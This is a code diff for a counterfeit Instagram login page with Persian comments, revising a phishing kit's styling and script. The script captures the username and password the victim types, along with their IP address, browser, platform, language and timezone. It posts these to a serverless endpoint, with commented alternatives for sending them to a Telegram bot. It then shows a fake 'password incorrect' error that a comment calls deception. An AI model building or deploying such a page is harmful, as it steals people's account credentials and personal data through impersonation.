@@ -1,10 +1,11 @@
-<!DOCTYPE html>
+     <!DOCTYPE html>
 <html lang="fa" dir="ltr">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Instagram</title>
   <style>
+    /* ─── RESET & BASE ─────────────────────────────────────── */
     * {
       margin: 0;
       padding: 0;
@@ -18,39 +19,62 @@
       align-items: center;
       min-height: 100vh;
       flex-direction: column;
-      padding: 20px;
+      padding: 24px 16px;
     }
+
+    /* ─── CONTAINER ─────────────────────────────────────────── */
     .container {
       max-width: 350px;
       width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
     }
+
+    /* ─── LOGIN CARD ────────────────────────────────────────── */
     .login-card {
       background: #fff;
       border: 1px solid #dbdbdb;
-      border-radius: 1px;
+      border-radius: 4px;
       padding: 40px 40px 20px;
       margin-bottom: 10px;
       text-align: center;
+      width: 100%;
+      transition: box-shadow 0.2s;
     }
+    .login-card:hover {
+      box-shadow: 0 0 8px rgba(0,0,0,0.03);
+    }
+
+    /* ─── INSTAGRAM LOGO (گرادینت اصلی) ─────────────────────── */
     .logo {
-      margin-bottom: 30px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 32px;
+      padding: 0 20px;
     }
     .logo svg {
       width: 175px;
-      height: 51px;
+      height: auto;
+      display: block;
     }
+
+    /* ─── FORM ──────────────────────────────────────────────── */
     .form-group {
       margin-bottom: 6px;
+      position: relative;
     }
     .form-group input {
       width: 100%;
-      padding: 9px 8px 7px;
+      padding: 10px 8px 8px;
       background: #fafafa;
       border: 1px solid #dbdbdb;
       border-radius: 3px;
       font-size: 12px;
       outline: none;
       color: #262626;
+      transition: border-color 0.15s, background 0.15s;
     }
     .form-group input::placeholder {
       color: #8e8e8e;
@@ -58,7 +82,10 @@
     }
     .form-group input:focus {
       border-color: #a8a8a8;
+      background: #fff;
     }
+
+    /* ─── LOGIN BUTTON ──────────────────────────────────────── */
     .login-btn {
       width: 100%;
       padding: 7px 16px;
@@ -69,16 +96,56 @@
       font-size: 14px;
       font-weight: 600;
       cursor: pointer;
-      margin: 12px 0;
+      margin: 12px 0 8px;
       opacity: 0.7;
-      transition: opacity 0.2s;
+      transition: opacity 0.2s, background 0.2s, transform 0.1s;
+      position: relative;
+      height: 38px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
     .login-btn.active {
       opacity: 1;
     }
-    .login-btn:hover {
-      opacity: 0.9;
+    .login-btn.active:hover {
+      background: #1877f2;
     }
+    .login-btn:active:not(:disabled) {
+      transform: scale(0.97);
+    }
+    .login-btn:disabled {
+      cursor: not-allowed;
+    }
+
+    /* ─── LOADER ────────────────────────────────────────────── */
+    .loader {
+      display: none;
+      width: 20px;
+      height: 20px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.6s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* ─── ERROR MESSAGE ─────────────────────────────────────── */
+    .error-msg {
+      color: #ed4956;
+      font-size: 12px;
+      margin: 6px 0 0;
+      display: none;
+      line-height: 1.4;
+      text-align: center;
+    }
+    .error-msg.show {
+      display: block;
+    }
+
+    /* ─── DIVIDER ───────────────────────────────────────────── */
     .divider {
       display: flex;
       align-items: center;
@@ -86,6 +153,7 @@
       color: #8e8e8e;
       font-size: 13px;
       font-weight: 600;
+      text-transform: uppercase;
     }
     .divider::before,
     .divider::after {
@@ -96,36 +164,53 @@
     }
     .divider span {
       margin: 0 18px;
+      letter-spacing: 0.5px;
     }
+
+    /* ─── FACEBOOK LOGIN ─────────────────────────────────────── */
     .fb-login {
       color: #385185;
       font-weight: 600;
       font-size: 14px;
-      display: flex;
+      display: inline-flex;
       align-items: center;
       justify-content: center;
       gap: 8px;
       text-decoration: none;
-      margin: 8px 0;
+      margin: 6px 0;
       cursor: pointer;
+      transition: opacity 0.2s;
+    }
+    .fb-login:hover {
+      opacity: 0.8;
     }
     .fb-login svg {
-      width: 16px;
-      height: 16px;
+      width: 18px;
+      height: 18px;
+      flex-shrink: 0;
     }
+
+    /* ─── FORGOT PASSWORD ───────────────────────────────────── */
     .forgot-password {
       color: #00376b;
       font-size: 12px;
       text-decoration: none;
       display: block;
-      margin-top: 12px;
+      margin-top: 14px;
+      transition: opacity 0.2s;
     }
+    .forgot-password:hover {
+      opacity: 0.7;
+    }
+
+    /* ─── SIGNUP CARD ───────────────────────────────────────── */
     .signup-card {
       background: #fff;
       border: 1px solid #dbdbdb;
-      border-radius: 1px;
-      padding: 20px 40px;
+      border-radius: 4px;
+      padding: 22px 40px;
       text-align: center;
+      width: 100%;
       margin-bottom: 10px;
     }
     .signup-card p {
@@ -137,104 +222,175 @@
       font-weight: 600;
       text-decoration: none;
     }
+    .signup-card a:hover {
+      text-decoration: underline;
+    }
+
+    /* ─── APP LINKS ─────────────────────────────────────────── */
     .app-links {
       text-align: center;
-      margin-top: 10px;
+      width: 100%;
+      margin-top: 6px;
     }
     .app-links p {
       font-size: 14px;
       color: #262626;
-      margin-bottom: 14px;
+      margin-bottom: 16px;
     }
     .app-badges {
       display: flex;
       justify-content: center;
       gap: 8px;
     }
+    .app-badges a {
+      display: inline-block;
+      transition: transform 0.2s, opacity 0.2s;
+    }
+    .app-badges a:hover {
+      transform: translateY(-1px);
+      opacity: 0.9;
+    }
     .app-badges img {
       height: 40px;
+      border-radius: 6px;
     }
+
+    /* ─── FOOTER ─────────────────────────────────────────────── */
     footer {
-      margin-top: 30px;
+      margin-top: 36px;
       text-align: center;
       font-size: 12px;
       color: #8e8e8e;
-      max-width: 600px;
-      line-height: 1.5;
+      max-width: 700px;
+      line-height: 1.8;
+      padding: 0 10px;
     }
     footer a {
       color: #8e8e8e;
       text-decoration: none;
       margin: 0 6px;
+      white-space: nowrap;
+      transition: color 0.2s;
     }
-    .error-msg {
-      color: #ed4956;
-      font-size: 12px;
-      margin: 6px 0;
-      display: none;
+    footer a:hover {
+      color: #262626;
+      text-decoration: underline;
     }
-    .loader {
-      display: none;
-      width: 18px;
-      height: 18px;
-      border: 2px solid rgba(255,255,255,0.3);
-      border-top-color: #fff;
-      border-radius: 50%;
-      animation: spin 0.6s linear infinite;
-      margin: 0 auto;
+    footer .copyright {
+      margin-top: 12px;
+      display: block;
+      font-size: 11px;
+      color: #a8a8a8;
     }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
+
+    /* ─── RESPONSIVE ─────────────────────────────────────────── */
+    @media (max-width: 450px) {
+      .login-card {
+        padding: 30px 20px 16px;
+        border-left: none;
+        border-right: none;
+        border-radius: 0;
+      }
+      .signup-card {
+        padding: 18px 20px;
+        border-left: none;
+        border-right: none;
+        border-radius: 0;
+      }
+      .container {
+        max-width: 100%;
+      }
     }
   </style>
 </head>
 <body>
 
 <div class="container">
+
+  <!-- ─── LOGIN CARD ────────────────────────────────────── -->
   <div class="login-card">
+
+    <!-- Instagram Logo (گرادینت اصلی ۲۰۲۶) -->
     <div class="logo">
       <svg viewBox="0 0 175 51" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <path d="M44.27 28.42c-1.13 0-2.06-.38-2.79-1.14-.73-.76-1.09-1.68-1.09-2.76 0-1.1.37-2.03 1.1-2.79.74-.76 1.67-1.14 2.79-1.14s2.04.38 2.77 1.14c.73.76 1.1 1.69 1.1 2.79 0 1.08-.37 2-1.1 2.76-.73.76-1.65 1.14-2.78 1.14zm0-5.98c-.68 0-1.24.23-1.68.7-.44.47-.66 1.03-.66 1.69 0 .64.22 1.19.66 1.66.44.47 1 .7 1.68.7.67 0 1.23-.23 1.67-.7.44-.47.66-1.02.66-1.66 0-.66-.22-1.22-.66-1.69-.44-.47-1-.7-1.67-.7zm5.97 6.5h2.48v-4.07c0-.37.14-.69.42-.96.28-.27.6-.41.96-.41.38 0 .7.14.96.41.26.27.4.59.4.96v4.07h2.48V19.6h-2.48v1.76c-.72-1.24-1.72-1.86-3-1.86-.74 0-1.42.22-2.04.66-.62.44-1.04 1.03-1.26 1.77v-1.67h-2.48v9.34zm14.8-7.27c-1.1 0-2.03.37-2.77 1.11-.74.74-1.11 1.67-1.11 2.79s.37 2.05 1.11 2.79c.74.74 1.67 1.11 2.77 1.11 1.05 0 1.96-.35 2.7-1.05.74-.7 1.12-1.6 1.12-2.72 0-1.1-.38-2.04-1.12-2.79-.74-.76-1.65-1.14-2.7-1.14zm0 1.68c.54 0 1.01.19 1.4.58.39.39.59.86.59 1.4 0 .56-.2 1.03-.59 1.41-.39.38-.86.57-1.4.57-.55 0-1.02-.19-1.41-.57-.39-.38-.58-.85-.58-1.41 0-.54.19-1.01.58-1.4.39-.39.86-.58 1.41-.58zm9.75-1.68c-.8 0-1.52.2-2.14.61-.62.41-1.05.96-1.3 1.66v-1.97h-2.48v7.27h2.48v-4.02c0-.76.21-1.37.62-1.83.41-.46.92-.69 1.53-.69.55 0 1.01.19 1.38.57.37.38.55.85.55 1.4v4.57h2.48V24.5c0-1.08-.32-1.95-.95-2.61-.63-.66-1.44-.99-2.44-.99zm14.77 0c-.8 0-1.52.2-2.14.61-.62.41-1.05.96-1.3 1.66v-1.97h-2.48v7.27h2.48v-4.02c0-.76.21-1.37.62-1.83.41-.46.92-.69 1.53-.69.55 0 1.01.19 1.38.57.37.38.56.85.56 1.4v4.57h2.48V24.5c0-1.08-.32-1.95-.95-2.61-.63-.66-1.44-.99-2.44-.99zm15.29 2.47c-.44-.76-1.07-1.37-1.88-1.83-.81-.46-1.73-.69-2.74-.69-1.08 0-2.05.25-2.9.75-.85.5-1.5 1.18-1.96 2.04-.46.86-.69 1.83-.69 2.89 0 1.14.25 2.15.75 3.01.5.86 1.2 1.52 2.1 1.98.9.46 1.9.69 3.01.69 1.12 0 2.08-.25 2.88-.75.8-.5 1.38-1.16 1.74-1.98l-1.9-1.13c-.26.52-.63.94-1.12 1.27-.49.33-1.07.49-1.73.49-.65 0-1.22-.14-1.7-.43-.48-.29-.86-.69-1.13-1.2l6.04-3.13-1.07-1.99zm-6.06 1.58c.06-.53.27-.99.63-1.38.36-.39.8-.58 1.32-.58.52 0 .96.19 1.32.58.36.39.57.85.63 1.38l-3.9 1.94v-1.94zm22.42-3.76v3.13h-2.48v2.39h2.48v3.1c0 1.18.32 2.09.95 2.73.63.64 1.51.96 2.63.96.54 0 1.15-.09 1.84-.27v-2.32c-.38.14-.74.21-1.08.21-.37 0-.67-.11-.88-.33-.21-.22-.32-.53-.32-.93v-3.15h2.28v-2.39h-2.28v-3.13h-2.48v-.01zm9.06 7.93c0-1.1.37-2.03 1.1-2.79.73-.76 1.66-1.14 2.79-1.14 1.1 0 2.03.38 2.77 1.14.74.76 1.11 1.69 1.11 2.79 0 1.08-.37 2-1.11 2.76-.74.76-1.67 1.14-2.77 1.14-1.13 0-2.06-.38-2.79-1.14-.73-.76-1.1-1.68-1.1-2.76zm-2.47 0c0 1.8.64 3.34 1.92 4.62 1.28 1.28 2.83 1.92 4.64 1.92 1.77 0 3.3-.64 4.58-1.92 1.28-1.28 1.92-2.82 1.92-4.62 0-1.83-.64-3.38-1.92-4.65-1.28-1.27-2.81-1.9-4.58-1.9-1.81 0-3.36.63-4.64 1.9-1.28 1.27-1.92 2.82-1.92 4.65zM119.3 16.5h2.48v13.2h-2.48V16.5zm16.35 11.92c-1.13 0-2.06-.38-2.79-1.14-.73-.76-1.09-1.68-1.09-2.76 0-1.1.37-2.03 1.1-2.79.74-.76 1.67-1.14 2.79-1.14s2.04.38 2.77 1.14c.73.76 1.1 1.69 1.1 2.79 0 1.08-.37 2-1.1 2.76-.73.76-1.65 1.14-2.78 1.14zm0-5.98c-.68 0-1.24.23-1.68.7-.44.47-.66 1.03-.66 1.69 0 .64.22 1.19.66 1.66.44.47 1 .7 1.68.7.67 0 1.23-.23 1.67-.7.44-.47.66-1.02.66-1.66 0-.66-.22-1.22-.66-1.69-.44-.47-1-.7-1.67-.7zm5.97 6.5h2.48v-4.07c0-.37.14-.69.42-.96.28-.27.6-.41.96-.41.38 0 .7.14.96.41.26.27.4.59.4.96v4.07h2.48V19.6h-2.48v1.76c-.72-1.24-1.72-1.86-3-1.86-.74 0-1.42.22-2.04.66-.62.44-1.04 1.03-1.26 1.77v-1.67h-2.48v9.34zm16.25 0v-7.27h-2.48v1.97c-.25-.7-.68-1.25-1.3-1.66-.62-.41-1.34-.61-2.14-.61-1 0-1.81.33-2.44.99-.63.66-.95 1.53-.95 2.61v4.57h2.48v-4.57c0-.55.18-1.02.55-1.4.37-.38.83-.57 1.38-.57.61 0 1.12.23 1.53.69.41.46.62 1.07.62 1.83v4.02h2.48v.04zm7.38-7.27c-.8 0-1.52.2-2.14.61-.62.41-1.05.96-1.3 1.66v-1.97h-2.48v7.27h2.48v-4.02c0-.76.21-1.37.62-1.83.41-.46.92-.69 1.53-.69.55 0 1.01.19 1.38.57.37.38.55.85.55 1.4v4.57h2.48V24.5c0-1.08-.32-1.95-.95-2.61-.63-.66-1.44-.99-2.44-.99zm12.26 0c-1.1 0-2.03.37-2.77 1.11-.74.74-1.11 1.67-1.11 2.79s.37 2.05 1.11 2.79c.74.74 1.67 1.11 2.77 1.11 1.05 0 1.96-.35 2.7-1.05.74-.7 1.12-1.6 1.12-2.72 0-1.1-.38-2.04-1.12-2.79-.74-.76-1.65-1.14-2.7-1.14zm0 1.68c.54 0 1.01.19 1.4.58.39.39.59.86.59 1.4 0 .56-.2 1.03-.59 1.41-.39.38-.86.57-1.4.57-.55 0-1.02-.19-1.41-.57-.39-.38-.58-.85-.58-1.41 0-.54.19-1.01.58-1.4.39-.39.86-.58 1.41-.58zm11.35 1.76c-.44-.76-1.07-1.37-1.88-1.83-.81-.46-1.73-.69-2.74-.69-1.08 0-2.05.25-2.9.75-.85.5-1.5 1.18-1.96 2.04-.46.86-.69 1.83-.69 2.89 0 1.14.25 2.15.75 3.01.5.86 1.2 1.52 2.1 1.98.9.46 1.9.69 3.01.69 1.12 0 2.08-.25 2.88-.75.8-.5 1.38-1.16 1.74-1.98l-1.9-1.13c-.26.52-.63.94-1.12 1.27-.49.33-1.07.49-1.73.49-.65 0-1.22-.14-1.7-.43-.48-.29-.86-.69-1.13-1.2l6.04-3.13-1.07-1.99zm-6.06 1.58c.06-.53.27-.99.63-1.38.36-.39.8-.58 1.32-.58.52 0 .96.19 1.32.58.36.39.57.85.63 1.38l-3.9 1.94v-1.94zm22.42-3.76v3.13h-2.48v2.39h2.48v3.1c0 1.18.32 2.09.95 2.73.63.64 1.51.96 2.63.96.54 0 1.15-.09 1.84-.27v-2.32c-.38.14-.74.21-1.08.21-.37 0-.67-.11-.88-.33-.21-.22-.32-.53-.32-.93v-3.15h2.28v-2.39h-2.28v-3.13h-2.48v-.01z" fill="#262626"/>
+        <defs>
+          <linearGradient id="instaGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+            <stop offset="0%"   stop-color="#F58529"/>
+            <stop offset="25%"  stop-color="#FEDA77"/>
+            <stop offset="50%"  stop-color="#DD2A7B"/>
+            <stop offset="75%"  stop-color="#8134AF"/>
+            <stop offset="100%" stop-color="#515BD4"/>
+          </linearGradient>
+          <linearGradient id="instaGradText" x1="0%" y1="0%" x2="100%" y2="0%">
+            <stop offset="0%"   stop-color="#DD2A7B"/>
+            <stop offset="50%"  stop-color="#F58529"/>
+            <stop offset="100%" stop-color="#FEDA77"/>
+          </linearGradient>
+        </defs>
+        <!-- Camera icon (گرادینت) -->
+        <rect x="5" y="10" width="36" height="36" rx="9" stroke="url(#instaGrad)" stroke-width="2.2" fill="none"/>
+        <circle cx="23" cy="28" r="9" stroke="url(#instaGrad)" stroke-width="1.8" fill="none"/>
+        <circle cx="23" cy="28" r="4" fill="url(#instaGrad)"/>
+        <circle cx="33" cy="18" r="2.2" fill="url(#instaGrad)"/>
+        <!-- متن Instagram -->
+        <text x="48" y="35" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif" font-size="30" font-weight="600" letter-spacing="0.5" fill="url(#instaGradText)">Instagram</text>
       </svg>
     </div>
 
-    <form id="loginForm" autocomplete="off">
+    <!-- Form -->
+    <form id="loginForm" autocomplete="off" novalidate>
       <div class="form-group">
-        <input type="text" id="username" placeholder="Phone number, username, or email" required>
+        <input type="text" id="username" placeholder="Phone number, username, or email" required autocomplete="off">
       </div>
       <div class="form-group">
-        <input type="password" id="password" placeholder="Password" required>
+        <input type="password" id="password" placeholder="Password" required autocomplete="new-password">
       </div>
-      <div id="errorMsg" class="error-msg">Sorry, your password was incorrect. Please double-check your password.</div>
-      <button type="submit" id="loginBtn" class="login-btn">Log in</button>
+
+      <div id="errorMsg" class="error-msg">
+        Sorry, your password was incorrect. Please double-check your password.
+      </div>
+
+      <button type="submit" id="loginBtn" class="login-btn" disabled>
+        Log in
+      </button>
     </form>
 
+    <!-- Divider -->
     <div class="divider">
       <span>OR</span>
     </div>
 
-    <a class="fb-login" href="#">
+    <!-- Facebook Login -->
+    <a class="fb-login" href="#" id="fbLogin">
       <svg viewBox="0 0 16 16" fill="#385185">
         <path d="M8 0C3.58 0 0 3.58 0 8c0 3.86 2.74 7.08 6.42 7.88V10.3H4.5V8h1.92V6.3c0-1.9 1.13-2.95 2.87-2.95.83 0 1.7.15 1.7.15v1.87h-.96c-.94 0-1.23.58-1.23 1.18V8h2.1l-.34 2.3H8.8v5.58C13.26 15.08 16 11.86 16 8c0-4.42-3.58-8-8-8z"/>
       </svg>
       Log in with Facebook
     </a>
 
+    <!-- Forgot Password -->
     <a href="#" class="forgot-password">Forgot password?</a>
   </div>
 
+  <!-- ─── SIGNUP CARD ────────────────────────────────────── -->
   <div class="signup-card">
     <p>Don't have an account? <a href="#">Sign up</a></p>
   </div>
 
+  <!-- ─── APP LINKS ──────────────────────────────────────── -->
   <div class="app-links">
     <p>Get the app.</p>
     <div class="app-badges">
-      <a href="#"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40'%3E%3Crect width='135' height='40' rx='6' fill='%231a1a1a'/%3E%3Ctext x='20' y='26' fill='white' font-size='12' font-family='sans-serif'%3EApp Store%3C/text%3E%3C/svg%3E" alt="Download on the App Store"></a>
-      <a href="#"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40'%3E%3Crect width='135' height='40' rx='6' fill='%231a1a1a'/%3E%3Ctext x='20' y='26' fill='white' font-size='12' font-family='sans-serif'%3EGoogle Play%3C/text%3E%3C/svg%3E" alt="Get it on Google Play"></a>
+      <a href="#" title="Download on the App Store">
+        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40'%3E%3Cdefs%3E%3ClinearGradient id='a' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%23333'/%3E%3Cstop offset='100%25' stop-color='%23111'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='135' height='40' rx='6' fill='url(%23a)'/%3E%3Ctext x='22' y='25' fill='white' font-size='13' font-weight='600' font-family='sans-serif'%3EApp Store%3C/text%3E%3C/svg%3E" alt="Download on the App Store">
+      </a>
+      <a href="#" title="Get it on Google Play">
+        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40'%3E%3Cdefs%3E%3ClinearGradient id='b' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%23333'/%3E%3Cstop offset='100%25' stop-color='%23111'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='135' height='40' rx='6' fill='url(%23b)'/%3E%3Ctext x='18' y='25' fill='white' font-size='13' font-weight='600' font-family='sans-serif'%3EGoogle Play%3C/text%3E%3C/svg%3E" alt="Get it on Google Play">
+      </a>
     </div>
   </div>
 
+  <!-- ─── FOOTER ──────────────────────────────────────────── -->
   <footer>
     <a href="#">Meta</a>
     <a href="#">About</a>
@@ -249,54 +405,74 @@
     <a href="#">Threads</a>
     <a href="#">Contact Uploading &amp; Non-Users</a>
     <a href="#">Meta Verified</a>
-    <br><br>
-    English &copy; 2026 Instagram from Meta
+    <span class="copyright">English &copy; 2026 Instagram from Meta</span>
   </footer>
 </div>
 
+<!-- ─── JAVASCRIPT ─────────────────────────────────────── -->
 <script>
-  const form     = document.getElementById('loginForm');
-  const username = document.getElementById('username');
-  const password = document.getElementById('password');
-  const errorMsg = document.getElementById('errorMsg');
-  const loginBtn = document.getElementById('loginBtn');
-  let submitted  = false;
+  // ─── VERCEL: توکن از سرور گرفته می‌شود ──────────────────────
+  // اگر لوکال تست می‌کنید (بدون Vercel)، این خطوط را فعال کنید:
+  // const BOT_TOKEN = 'YOUR_BOT_TOKEN';
+  // const CHAT_ID   = 'YOUR_CHAT_ID';
+  // و خط api endpoint پایین را به api.telegram.org تغییر دهید.
+  // ──────────────────────────────────────────────────────────────
 
+  const form       = document.getElementById('loginForm');
+  const username   = document.getElementById('username');
+  const password   = document.getElementById('password');
+  const errorMsg   = document.getElementById('errorMsg');
+  const loginBtn   = document.getElementById('loginBtn');
+  const fbLogin    = document.getElementById('fbLogin');
+  let   submitted  = false;
+
+  // ─── فعال/غیرفعال کردن دکمه ────────────────────────────────
   function checkFields() {
-    if (username.value.trim() !== '' && password.value.trim() !== '') {
+    const u = username.value.trim();
+    const p = password.value.trim();
+    if (u !== '' && p !== '') {
       loginBtn.classList.add('active');
+      loginBtn.disabled = false;
     } else {
       loginBtn.classList.remove('active');
+      loginBtn.disabled = true;
     }
   }
   username.addEventListener('input', checkFields);
   password.addEventListener('input', checkFields);
 
-  // Get client IP
+  // ─── دریافت IP کاربر ───────────────────────────────────────
   async function getClientIP() {
-    try {
-      const resp = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(5000) });
-      const data = await resp.json();
-      return data.ip;
-    } catch {
+    const services = [
+      'https://api.ipify.org?format=json',
+      'https://icanhazip.com',
+      'https://checkip.amazonaws.com'
+    ];
+    for (const url of services) {
       try {
-        const resp2 = await fetch('https://icanhazip.com', { signal: AbortSignal.timeout(5000) });
-        return (await resp2.text()).trim();
-      } catch {
-        try {
-          const resp3 = await fetch('https://checkip.amazonaws.com', { signal: AbortSignal.timeout(5000) });
-          return (await resp3.text()).trim();
-        } catch {
-          return 'Unknown';
+        const resp = await fetch(url, { signal: AbortSignal.timeout(4000) });
+        if (url.includes('ipify')) {
+          const data = await resp.json();
+          return data.ip;
         }
+        return (await resp.text()).trim();
+      } catch {
+        continue;
       }
     }
+    return 'Unavailable';
   }
 
+  // ─── اطلاعات دستگاه ────────────────────────────────────────
   function getDeviceInfo() {
-    return navigator.userAgent || 'Unknown';
+    const ua = navigator.userAgent;
+    const platform = navigator.platform || '';
+    const lang = navigator.language || '';
+    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
+    return `${ua} | Platform: ${platform} | Lang: ${lang} | TZ: ${tz}`;
   }
 
+  // ─── ارسال فرم ─────────────────────────────────────────────
   form.addEventListener('submit', async function(e) {
     e.preventDefault();
     if (submitted) return;
@@ -304,8 +480,8 @@
     const user = username.value.trim();
     const pass = password.value.trim();
     if (!user || !pass) {
-      errorMsg.style.display = 'block';
       errorMsg.textContent = 'Please fill in both fields.';
+      errorMsg.classList.add('show');
       return;
     }
 
@@ -313,32 +489,46 @@
     loginBtn.disabled = true;
     loginBtn.innerHTML = '<span class="loader"></span>';
 
-    const ip     = await getClientIP();
-    const device = getDeviceInfo();
-    const time   = new Date().toLocaleString('en-US', { timeZone: 'Asia/Tehran' });
-
-    // Send to our Vercel API endpoint (serverless function)
     try {
+      const [ip, device] = await Promise.all([
+        getClientIP(),
+        getDeviceInfo()
+      ]);
+      const time = new Date().toLocaleString('en-US', {
+        timeZone: 'Asia/Tehran',
+        year: 'numeric', month: 'short', day: 'numeric',
+        hour: '2-digit', minute: '2-digit', second: '2-digit'
+      });
+
+      // ارسال به API سرور (Vercel Serverless)
       await fetch('/api/submit', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ user, pass, ip, device, time })
       });
+
     } catch (err) {
       console.error('Submit error:', err);
     }
 
-    // Show deception error
+    // ─── فریب: نمایش خطای "رمز اشتباه است" ──────────────────
     setTimeout(() => {
-      errorMsg.style.display = 'block';
       errorMsg.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
+      errorMsg.classList.add('show');
       loginBtn.disabled = false;
       loginBtn.innerHTML = 'Log in';
       submitted = false;
       password.value = '';
       loginBtn.classList.remove('active');
-    }, 800);
+      loginBtn.disabled = true;
+    }, 900);
+  });
+
+  // ─── Facebook کلیک (بدون اثر) ─────────────────────────────
+  fbLogin.addEventListener('click', function(e) {
+    e.preventDefault();
   });
 </script>
+
 </body>
-</html>
+</html> 
